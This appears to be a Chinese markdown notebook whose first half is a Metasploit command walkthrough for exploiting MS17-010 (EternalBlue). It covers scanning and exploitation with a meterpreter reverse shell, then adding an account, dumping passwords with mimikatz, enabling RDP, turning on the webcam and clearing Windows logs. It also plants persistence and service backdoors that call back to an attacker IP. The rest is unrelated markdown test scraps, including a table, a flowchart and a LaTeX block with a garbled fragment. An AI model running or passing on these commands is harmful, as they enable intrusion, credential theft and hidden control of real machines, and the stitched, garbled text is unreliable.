# ms17-010
- 漏洞扫描
		msfconsole  
		use auxiliary/scanner/smb/smb_ms17_010
		set RHOSTS 192.168.1.129  
		run  
- 使用攻击模块
		use exploit/windows/smb/ms17_010_eternalblue		
		set RHOST 192.168.1.129
		set PAYLOAD windows/x64/meterpreter/reverse_tcp
		run

		getuid    											--查询当前用户权限为SYSTEM,获取到到最高权限
		sysinfo   											--系统信息查询
		screenshot											--桌面抓图
		webcam_scream										--视频开启
		run post/windows/manage/enable_rdp 					--开启远程连接
		shell												--直接进入系统shell,添加账号
		net user test 123 /add
		load mimikatz										--获取系统管理密码
		wdigest
		tspkg
		mimikatz_command -f samdump::hashes
		mimikatz_command -f sekurlsa::searchPasswords
		rdesktop -f 192.168.1.115:3389 -u Administrator -p 2003	--开启远程连接
		clearav  												--清除windows中的应用程序日志、系统日志、安全日志
- 后门植入 persistence启动项后门#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip
		run persistence -X -i 5 -p 6661 -r 192.168.1.126  
		msf > use exploit/multi/handler
		msf > set payload windows/meterpreter/reverse_tcp
		msf > set LHOST 192.168.1.126
		msf > set LPORT 6661
		msf > exploit
- 后门植入 metsvc服务后门在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter
		run metsvc –A   										--自动安装后门
		msf > use exploit/multi/handler
		msf > set payload windows/metsvc_bind_tcp
		msf > set RHOST 192.168.159.144
		msf > set LPORT 31337
		msf > exploit

# ms08_067
# ms14_064
# ms10_061
# ms03_026
# ms06_040
	chcp 65001					--解决乱码问题


姓名|技能|排行
--|:--:|--:
刘备|哭|大哥
关羽|打|二哥
张飞|骂|三弟

|  表头   | 表头  |
|  ----  | ----  |
| 单元格  | 单元格 |
| 单元格  | 单元格 |

使用 <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> 重启电脑


$$
\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix}
\mathbf{i} & \mathbf{j} & \mathbf{k} \\
\frac{\partial X}{\partial u} &  \frac{\partial Y}{\partial u} & 0 \\
\frac{\partial X}{\partial v} &  \frac{\partial Y}{\partial v} & 0 \\
\end{vmatrix}
$$tep1}{\style{visibility:hidden}{(x+1)(x+1)}}
$$




flow
st=>start: Start
op=>operation: Your Operation
cond=>condition: Yes or No?
e=>end
st->op->cond
cond(yes)->e
cond(no)->op
